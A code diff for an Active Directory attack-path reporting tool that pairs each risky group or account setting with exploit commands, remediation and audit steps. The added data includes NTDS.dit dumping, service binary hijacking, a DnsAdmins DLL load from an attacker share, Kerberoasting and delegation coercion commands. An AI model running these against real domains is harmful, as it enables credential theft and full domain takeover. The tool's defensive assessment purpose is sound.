@@ -467,6 +467,14 @@ func buildD3JSON(g *graph.Graph, paths []graph.AttackPath) string {
 	return marshalD3(d3)
 }
 
+// pathExploitResult holds structured exploit/remediation data for a path card.
+type pathExploitResult struct {
+	Description string
+	Commands    []string
+	Fix         string
+	AuditCmd    string
+}
+
 // marshalD3 — простий JSON серіалізатор для D3Graph
 func marshalD3(d3 D3Graph) string {
 	var sb strings.Builder
@@ -687,49 +695,162 @@ func templateFuncs() template.FuncMap {
 				return fmt.Sprintf("0x%04x", d)
 			}
 		},
-		"pathExploit": func(nodes []graph.Node, targetGroup string) string {
+		"pathExploitData": func(nodes []graph.Node, targetGroup string) pathExploitResult {
+			exploits := map[string]pathExploitResult{
+				"Domain Admins": {
+					Description: "Transitive DA membership — existing credentials grant full domain compromise. Attacker can authenticate to any domain resource, dump NTDS via DCSync, or pivot via WinRM/SMB.",
+					Commands:    []string{},
+					Fix:         "Enforce least-privilege; remove transitive paths; apply AD Tiered Administration model.",
+					AuditCmd:    "Get-ADGroupMember 'Domain Admins' -Recursive",
+				},
+				"Enterprise Admins": {
+					Description: "Transitive EA membership — forest-wide compromise. Attacker can modify AD schema, manage all domains in forest, and create persistent backdoors at the configuration partition level.",
+					Commands:    []string{},
+					Fix:         "EA should be empty in steady-state; populate only for forest-level changes (schema updates, domain creation).",
+					AuditCmd:    "Get-ADGroupMember 'Enterprise Admins' -Recursive",
+				},
+				"Group Policy Creator Owners": {
+					Description: "Member of GPCO can create new GPOs and link them to OUs/domain. Malicious GPO with scheduled task or startup script → SYSTEM execution on every joined machine at next gpupdate.",
+					Commands: []string{
+						"New-GPO -Name 'Pwn' | New-GPLink -Target 'DC=domain,DC=local'",
+					},
+					Fix:      "Remove non-admins from GPCO; restrict GPO creation to dedicated T0 accounts; monitor SYSVOL for new GPO folders.",
+					AuditCmd: "Get-GPOReport -All -ReportType XML",
+				},
+				"Account Operators": {
+					Description: "Account Operators can create, modify, and delete user accounts and groups (except those protected by AdminSDHolder). Reset passwords on non-protected admins, then authenticate as them.",
+					Commands: []string{
+						"Set-ADAccountPassword -Identity <target> -NewPassword (ConvertTo-SecureString 'P@ss1' -AsPlainText -Force) -Reset",
+					},
+					Fix:      "Empty Account Operators in modern AD; use delegated OUs with specific permissions instead.",
+					AuditCmd: "Get-ADGroupMember 'Account Operators'",
+				},
+				"Backup Operators": {
+					Description: "SeBackupPrivilege + SeRestorePrivilege on a Domain Controller allow reading NTDS.dit (offline) and registry SYSTEM hive → extract all domain credentials including krbtgt.",
+					Commands: []string{
+						"diskshadow /s script.txt",
+						"robocopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopyN\\Windows\\NTDS . NTDS.dit",
+						"secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL",
+					},
+					Fix:      "Backup Operators on DCs is equivalent to DA; restrict to dedicated T0 backup tier only.",
+					AuditCmd: "Get-ADGroupMember 'Backup Operators'",
+				},
+				"Server Operators": {
+					Description: "Server Operators can manage services on Domain Controllers. Modify any service binary or its config to execute arbitrary code as SYSTEM.",
+					Commands: []string{
+						"sc.exe \\\\<DC> config <svc> binPath= \"C:\\path\\payload.exe\"",
+						"sc.exe \\\\<DC> start <svc>",
+					},
+					Fix:      "Empty Server Operators; use JEA (Just Enough Admin) for delegated server management.",
+					AuditCmd: "Get-ADGroupMember 'Server Operators'",
+				},
+				"Print Operators": {
+					Description: "SeLoadDriverPrivilege held by Print Operators allows loading arbitrary kernel drivers on the DC → SYSTEM via signed-but-vulnerable driver (BYOVD).",
+					Commands:    []string{},
+					Fix:         "Empty Print Operators; manage printers via dedicated service accounts with minimal rights.",
+					AuditCmd:    "Get-ADGroupMember 'Print Operators'",
+				},
+				"DnsAdmins": {
+					Description: "DnsAdmins can specify a DLL path via dnscmd ServerLevelPluginDll registry key. DNS service runs as SYSTEM on DC and loads the DLL on restart → SYSTEM RCE.",
+					Commands: []string{
+						"dnscmd <DC> /config /serverlevelplugindll \\\\<attacker>\\share\\evil.dll",
+						"sc.exe \\\\<DC> stop dns && sc.exe \\\\<DC> start dns",
+					},
+					Fix:      "Restrict DnsAdmins; monitor changes to ServerLevelPluginDll registry value.",
+					AuditCmd: "Get-ADGroupMember 'DnsAdmins'",
+				},
+			}
+
+			// Check for special node types first
 			for _, n := range nodes {
 				if n.Kerberoastable {
-					return "Kerberoast " + n.SAMAccountName + ": GetUserSPNs.py domain/user:pass → crack TGS → use creds to reach DA"
+					return pathExploitResult{
+						Description: "Account " + n.SAMAccountName + " has an SPN registered and is Kerberoastable. Request TGS ticket and crack offline.",
+						Commands:    []string{"GetUserSPNs.py domain/user:pass -dc-ip <DC> -request"},
+						Fix:         "Use gMSA or set a strong random password (25+ chars) on " + n.SAMAccountName + ".",
+						AuditCmd:    "Get-ADUser " + n.SAMAccountName + " -Properties ServicePrincipalName",
+					}
 				}
 				if n.ASREPRoastable {
-					return "AS-REP roast " + n.SAMAccountName + ": GetNPUsers.py domain/ -usersfile users.txt → crack hash → use creds"
+					return pathExploitResult{
+						Description: "Account " + n.SAMAccountName + " has 'Do not require Kerberos preauthentication' enabled. AS-REP hash can be obtained without credentials.",
+						Commands:    []string{"GetNPUsers.py domain/ -usersfile users.txt -dc-ip <DC>"},
+						Fix:         "Enable Kerberos preauthentication on " + n.SAMAccountName + ".",
+						AuditCmd:    "Get-ADUser " + n.SAMAccountName + " -Properties DoesNotRequirePreAuth",
+					}
 				}
 				if n.UnconstrainedDelegation {
-					return "Compromise " + n.SAMAccountName + " (unconstrained delegation) → harvest DA TGT via SpoolSample/PetitPotam"
+					return pathExploitResult{
+						Description: "Machine " + n.SAMAccountName + " has unconstrained delegation. Any user authenticating to it exposes their TGT — coerce a DC to authenticate via SpoolSample or PetitPotam.",
+						Commands: []string{
+							"Rubeus.exe monitor /interval:5 /filteruser:DC$",
+							"SpoolSample.exe <DC> <attacker-machine>",
+						},
+						Fix:      "Replace unconstrained delegation with RBCD or constrained delegation; add to Protected Users.",
+						AuditCmd: "Get-ADComputer " + n.SAMAccountName + " -Properties TrustedForDelegation",
+					}
 				}
 			}
-			type tpl struct{ exploit string }
-			exploits := map[string]string{
-				"Domain Admins":              "Transitive DA membership — existing credentials grant full domain compromise via net use \\\\DC\\IPC$, WinRM, or DCSync",
-				"Enterprise Admins":          "Transitive EA membership — forest-wide compromise; can modify schema and enterprise-level objects",
-				"Group Policy Creator Owners": "Member of GPCO — can create/modify GPOs linked to OUs/domain → SYSTEM on any joined machine via scheduled task or startup script",
-				"Account Operators":          "Member of Account Operators — can create/modify users and groups (except protected) → password reset on non-AdminSDHolder accounts",
-				"Backup Operators":           "Member of Backup Operators — SeBackupPrivilege on DC → dump NTDS.dit via diskshadow + robocopy → offline DCSync",
-				"Server Operators":           "Member of Server Operators — can manage services on DCs → install malicious service as SYSTEM → DA escalation",
-				"Print Operators":            "Member of Print Operators — SeLoadDriverPrivilege → load malicious kernel driver on DC → SYSTEM",
-				"DNSAdmins":                  "Member of DnsAdmins — DLL injection via dnscmd ServerLevelPluginDll → SYSTEM on DC running DNS service",
-			}
+
 			if e, ok := exploits[targetGroup]; ok {
 				return e
 			}
-			return "Account has transitive membership in " + targetGroup + " — existing credentials grant privileged access"
+			return pathExploitResult{
+				Description: "Account has transitive membership in " + targetGroup + " — existing credentials grant the rights of the target group.",
+				Commands:    []string{},
+				Fix:         "Audit group membership; apply least-privilege; use Tiered Administration.",
+				AuditCmd:    "",
+			}
 		},
-		"pathFix": func(targetGroup string) string {
-			fixes := map[string]string{
-				"Domain Admins":              "Enforce least-privilege; remove transitive paths; apply AD Tiered Administration. Audit: Get-ADGroupMember 'Domain Admins' -Recursive",
-				"Enterprise Admins":          "EA should be empty in steady-state; populate only for forest-level changes. Audit: Get-ADGroupMember 'Enterprise Admins' -Recursive",
-				"Group Policy Creator Owners": "Remove non-admins from GPCO; restrict GPO creation to dedicated T0 accounts; monitor SYSVOL for new GPOs. Audit: Get-GPOReport -All -ReportType XML",
-				"Account Operators":          "Empty Account Operators in modern AD; use delegated OUs with specific permissions instead",
-				"Backup Operators":           "Backup Operators on DCs is DA-equivalent; restrict to dedicated T0 backup tier only",
-				"Server Operators":           "Empty Server Operators; use JEA (Just Enough Administration) for delegated server management",
-				"Print Operators":            "Empty Print Operators; manage printers via dedicated service accounts with minimal rights",
-				"DNSAdmins":                  "Restrict DnsAdmins membership; monitor changes to ServerLevelPluginDll registry value on DNS servers",
+		"plural": func(n int, one, many string) string {
+			if n == 1 {
+				return one
 			}
-			if f, ok := fixes[targetGroup]; ok {
-				return f
+			return many
+		},
+		"barColor": func(score, cap int) template.CSS {
+			if cap == 0 {
+				return template.CSS("var(--text-sev-medium)")
 			}
-			return "Enforce least-privilege; remove transitive group membership paths; apply AD Tiered Administration model"
+			pct := score * 100 / cap
+			switch {
+			case pct >= 75:
+				return template.CSS("var(--text-sev-critical)")
+			case pct >= 40:
+				return template.CSS("var(--text-sev-high)")
+			default:
+				return template.CSS("var(--text-sev-medium)")
+			}
+		},
+		"capFor": func(cat string) int {
+			caps := map[string]int{
+				"Attack Paths": 30, "Dangerous ACLs": 20, "Kerberoasting": 15,
+				"AS-REP Roasting": 10, "Delegation": 15, "ADCS": 20,
+				"Policy": 15, "Stale Admins": 10, "No LAPS": 5, "Shadow Creds": 10,
+			}
+			if v, ok := caps[cat]; ok {
+				return v
+			}
+			return 10
+		},
+		"barWidth": func(score, cap int) int {
+			if cap == 0 {
+				return 0
+			}
+			pct := score * 100 / cap
+			if pct > 100 {
+				return 100
+			}
+			return pct
+		},
+		"isPrivilegedGroup": func(name string) bool {
+			privileged := map[string]bool{
+				"Domain Admins": true, "Enterprise Admins": true, "Administrators": true,
+				"Schema Admins": true, "Account Operators": true, "Backup Operators": true,
+				"Server Operators": true, "Print Operators": true, "DnsAdmins": true,
+				"Group Policy Creator Owners": true,
+			}
+			return privileged[name]
 		},
 	}
 }
@@ -1075,8 +1196,8 @@ th.sort-desc::after { content: ' ▼'; color: var(--accent); }
   .print-cover-grade { font-size: 8rem; font-weight: 800; }
   .nav, .global-search-wrap, #theme-toggle, .xp-btns, .filter-bar,
   .show-all-btn, #gs-clear, #graph-tooltip { display: none !important; }
-  .tab-pane { display: block !important; page-break-before: always; }
-  .tab-pane:first-of-type { page-break-before: auto; }
+  .tab-pane { display: block !important; }
+  .tab-pane:not(:first-of-type) { page-break-before: always; }
   .acc-body, .exp-body, .group-body { display: block !important; }
   .path-card, .acl-card, .card, .exp-section { page-break-inside: avoid; }
   * { box-shadow: none !important; transition: none !important; }
@@ -1119,7 +1240,7 @@ th.sort-desc::after { content: ' ▼'; color: var(--accent); }
     </svg>
     <div class="header-logo-text">
       <div class="header-logo-name"><em>ad</em>path</div>
-      <div class="header-logo-tag">v0.9.8 · AD Attack Path Analysis</div>
+      <div class="header-logo-tag">v{{.Version}} · AD Attack Path Analysis</div>
     </div>
   </div>
   <div class="meta">
@@ -1159,7 +1280,7 @@ th.sort-desc::after { content: ' ▼'; color: var(--accent); }
   <button role="tab" aria-selected="false" aria-controls="tab-shadow" id="tab-btn-shadow" onclick="showTab('shadow')">Shadow Creds {{if gt .Summary.ShadowCredCount 0}}({{.Summary.ShadowCredCount}}){{end}}</button>
   <button role="tab" aria-selected="false" aria-controls="tab-ldapsec" id="tab-btn-ldapsec" onclick="showTab('ldapsec')">LDAP Security {{if .LDAPSecurityResult}}{{if not .LDAPSecurityResult.SigningEnforced}}⚠{{end}}{{end}}</button>
   <button role="tab" aria-selected="false" aria-controls="tab-audit" id="tab-btn-audit" onclick="showTab('audit')">Audit {{if gt .Summary.AuditFindingCount 0}}({{.Summary.AuditFindingCount}}){{end}}</button>
-  <button role="tab" aria-selected="false" aria-controls="tab-sysvol" id="tab-btn-sysvol" onclick="showTab('sysvol')">SYSVOL {{if .SYSVOLResult}}{{if .SYSVOLResult.Findings}}({{len .SYSVOLResult.Findings}}){{end}}{{end}}</button>
+  <button role="tab" aria-selected="false" aria-controls="tab-sysvol" id="tab-btn-sysvol" onclick="showTab('sysvol')">SYSVOL{{if .SYSVOLResult}}{{if .SYSVOLResult.Findings}} ({{len .SYSVOLResult.Findings}}){{end}}{{end}}</button>
   <button role="tab" aria-selected="false" aria-controls="tab-users" id="tab-btn-users" onclick="showTab('users')">Users ({{.Summary.TotalUsers}})</button>
   <button role="tab" aria-selected="false" aria-controls="tab-groups" id="tab-btn-groups" onclick="showTab('groups')">Groups ({{.Summary.TotalGroups}})</button>
   <button role="tab" aria-selected="false" aria-controls="tab-computers" id="tab-btn-computers" onclick="showTab('computers')">Computers ({{.Summary.TotalComputers}})</button>
@@ -1201,7 +1322,7 @@ th.sort-desc::after { content: ' ▼'; color: var(--accent); }
         <div style="font-size:0.95rem;color:var(--text-main);font-weight:600;margin-bottom:4px">{{$issue.Title}}</div>
         <div style="font-size:0.82rem;color:var(--text-secondary);line-height:1.5">{{$issue.Description}}</div>
       </div>
-      <button onclick="showTab('{{$issue.Tab}}')"
+      <button onclick="showTab('{{$issue.Tab}}'){{if $issue.Anchor}};setTimeout(function(){var e=document.getElementById('{{$issue.Anchor}}');if(e)e.scrollIntoView({behavior:'smooth',block:'start'});},100){{end}}"
         style="background:var(--bg-hover);border:1px solid var(--border);border-radius:6px;
         color:var(--accent);padding:6px 14px;font-size:0.8rem;cursor:pointer;white-space:nowrap">
         View &rarr;
@@ -1211,12 +1332,12 @@ th.sort-desc::after { content: ' ▼'; color: var(--accent); }
   </div>
   {{end}}
 
-  <!-- Quick stats -->
+  <!-- Quick stats — environment size + health -->
   <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:12px;margin-bottom:24px">
-    <div class="card {{if gt .TotalCritical 0}}critical{{else}}ok{{end}}"><div class="value">{{.TotalCritical}}</div><div class="label">Critical Findings</div></div>
-    <div class="card {{if gt .TotalHigh 0}}warning{{else}}ok{{end}}"><div class="value">{{.TotalHigh}}</div><div class="label">High Findings</div></div>
-    <div class="card {{if gt .Summary.AttackPathsCount 0}}critical{{else}}ok{{end}}"><div class="value">{{.Summary.AttackPathsCount}}</div><div class="label">Attack Paths</div></div>
-    <div class="card {{if gt .Summary.DangerousACLCount 0}}critical{{else}}ok{{end}}"><div class="value">{{.Summary.DangerousACLCount}}</div><div class="label">Dangerous ACLs</div></div>
+    <div class="card"><div class="value">{{.Summary.TotalUsers}}</div><div class="label">Users</div></div>
+    <div class="card"><div class="value">{{.Summary.TotalComputers}}</div><div class="label">Computers</div></div>
+    <div class="card"><div class="value">{{.Summary.TotalGroups}}</div><div class="label">Groups</div></div>
+    <div class="card {{if gt .Summary.KrbtgtPwdAgeDays 180}}warning{{else}}ok{{end}}"><div class="value">{{if eq .Summary.KrbtgtPwdAgeDays 0}}?{{else}}{{.Summary.KrbtgtPwdAgeDays}}d{{end}}</div><div class="label">Krbtgt Pwd Age</div></div>
   </div>
 
   <!-- Scope -->
@@ -1250,7 +1371,7 @@ th.sort-desc::after { content: ' ▼'; color: var(--accent); }
         <div style="display:flex;align-items:center;gap:12px;font-size:0.82rem">
           <div style="width:140px;color:var(--text-secondary)">{{$cat}}</div>
           <div style="flex:1;background:var(--bg-hover);border-radius:3px;height:6px;overflow:hidden">
-            <div style="width:{{$score}}%;height:100%;background:var(--text-sev-critical)"></div>
+            <div style="width:{{barWidth $score (capFor $cat)}}%;height:100%;background:{{barColor $score (capFor $cat)}}"></div>
           </div>
           <div style="width:30px;text-align:right;color:var(--text-main);font-weight:600">{{$score}}</div>
         </div>
@@ -1342,7 +1463,7 @@ th.sort-desc::after { content: ' ▼'; color: var(--accent); }
   </div>
 
   <!-- Policy & Configuration -->
-  <div style="font-size:11px;font-weight:500;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px">Policy & Configuration</div>
+  <div id="policy-section" style="font-size:11px;font-weight:500;color:var(--text-muted);text-transform:uppercase;letter-spacing:.06em;margin-bottom:8px">Policy & Configuration</div>
   <div style="background:var(--bg-card);border:1px solid var(--border);border-radius:8px;overflow:hidden">
     {{if .GPOResult}}{{if .GPOResult.DefaultPolicy}}
     {{$pp := .GPOResult.DefaultPolicy}}
@@ -1398,7 +1519,7 @@ th.sort-desc::after { content: ' ▼'; color: var(--accent); }
 <div id="tab-paths" class="tab-pane" role="tabpanel" aria-labelledby="tab-btn-paths" tabindex="0" aria-hidden="true">
   <h2 class="section-title">
     Attack Paths to Privileged Groups
-    <span>{{.Summary.AttackPathsCount}} path(s) found</span>
+    <span>{{.Summary.AttackPathsCount}} {{plural .Summary.AttackPathsCount "path" "paths"}} found</span>
     <span class="help-icon" role="tooltip" tabindex="0" data-tip="A chain of AD relationships (group memberships, ACL rights, delegation) that leads a low-privileged account to Domain Admins or another privileged group. Depth 1 = direct member. Depth 2+ = indirect via nested groups or ACL abuse. Shorter paths = higher priority.">?</span>
   </h2>
   {{if eq .Summary.AttackPathsCount 0}}
@@ -1421,7 +1542,7 @@ th.sort-desc::after { content: ' ▼'; color: var(--accent); }
       <div class="path-chain">
         {{range $j, $node := $path.Nodes}}
           <div class="path-node
-            {{if $node.AdminCount}}is-admin{{end}}
+            {{if or $node.AdminCount (isPrivilegedGroup $node.SAMAccountName)}}is-admin{{end}}
             {{if $node.Kerberoastable}}is-kerb{{end}}">
             {{nodeTypeIcon $node.Type}} {{$node.SAMAccountName}}
           </div>
@@ -1434,10 +1555,18 @@ th.sort-desc::after { content: ' ▼'; color: var(--accent); }
         <span class="acc-chevron">▶</span> <span style="color:var(--text-sev-critical);font-weight:600">Exploit</span> <span style="color:var(--text-muted)">/</span> <span style="color:var(--color-ok);font-weight:600">Remediation</span>
       </button>
       <div class="acc-body">
+        {{with pathExploitData $path.Nodes $path.TargetGroup}}
         <div class="acc-label">Exploit</div>
-        <div class="acc-cmd-wrap"><code class="acc-cmd">{{pathExploit $path.Nodes $path.TargetGroup}}</code><button class="acc-cmd-copy" onclick="copyCmd(this)" title="Copy to clipboard">📋</button></div>
-        <div class="acc-label" style="margin-top:10px">Fix</div>
-        <div style="color:var(--text-secondary)">{{pathFix $path.TargetGroup}}</div>
+        <div style="color:var(--text-secondary);line-height:1.6;margin-bottom:8px">{{.Description}}</div>
+        {{range .Commands}}
+        <div class="acc-cmd-wrap"><code class="acc-cmd">{{.}}</code><button class="acc-cmd-copy" onclick="copyCmd(this)" title="Copy to clipboard">📋</button></div>
+        {{end}}
+        <div class="acc-label" style="margin-top:10px">Remediation</div>
+        <div style="color:var(--text-secondary);line-height:1.6;margin-bottom:8px">{{.Fix}}</div>
+        {{if .AuditCmd}}
+        <div class="acc-cmd-wrap"><code class="acc-cmd">{{.AuditCmd}}</code><button class="acc-cmd-copy" onclick="copyCmd(this)" title="Copy to clipboard">📋</button></div>
+        {{end}}
+        {{end}}
       </div>
     </div>
   </div>
@@ -2528,7 +2657,7 @@ th.sort-desc::after { content: ' ▼'; color: var(--accent); }
       <span class="chevron">▼</span>
       <span class="exp-title">Vulnerable Templates {{mitreBadges "adcs"}}</span>
       {{if .ADCSResult.TemplateFindings}}
-      <span class="badge badge-critical" style="margin-left:auto">{{.Summary.ADCSTemplateCount}} template(s)</span>
+      <span class="badge badge-critical" style="margin-left:auto">{{.Summary.ADCSTemplateCount}} {{plural .Summary.ADCSTemplateCount "template" "templates"}}</span>
       {{else}}<span class="badge badge-ok" style="margin-left:auto">&#10003; None</span>{{end}}
     </div>
     <div class="exp-body" style="padding:12px">
